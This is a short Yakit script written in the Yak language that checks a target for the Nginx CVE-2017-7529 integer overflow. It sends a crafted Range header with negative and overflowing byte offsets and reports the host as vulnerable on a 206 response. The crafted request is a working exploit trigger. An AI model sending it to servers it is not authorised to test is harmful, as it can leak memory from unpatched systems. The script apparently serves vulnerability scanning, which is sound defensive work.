yakit.AutoInitYakit()
target = cli.String("target")

host,port,err = str.ParseStringToHostPort(target)
if err !=  nil{
    yakit.Error("Parse target error [%v]",err)
    return
}
target = sprintf("%s:%d",host,port)

resp,_,err = poc.HTTP(`GET / HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
`,poc.params({
    "target" : target,
}))
if err != nil{
    yakit.Error("Send payload error [%v]",err)
    return
}
n = len(resp) + 623
header = sprintf("bytes=-%d,-9223372036854%d",n,776000-n)
resp,_,err = poc.HTTP(`GET / HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Range: {{params(range)}}
`,poc.params({
    "target" : target,
    "range": header,
}))
if err != nil {
    yakit.Error("Send payload error [%v]",err)
    return
}

res,err = poc.ParseBytesToHTTPResponse(resp)

if err != nil {
    yakit.Error("Parse Response error [%v]",err)
    return
}

if res.StatusCode == 206 && str.Contains(string(resp), "Content-Range"){
    yakit.Output(sprintf("[+] %s is Vulnerable",target))
    yakit.StatusCard("CVE-2017-7529", target)
    risk.NewRisk(
        target, 
        risk.title(sprintf("Nginx Remote Integer Overflow Vulnerability: %s", target)),
    )
}else{
    yakit.Output(sprintf("[-] %s is not Vulnerable",target))
}
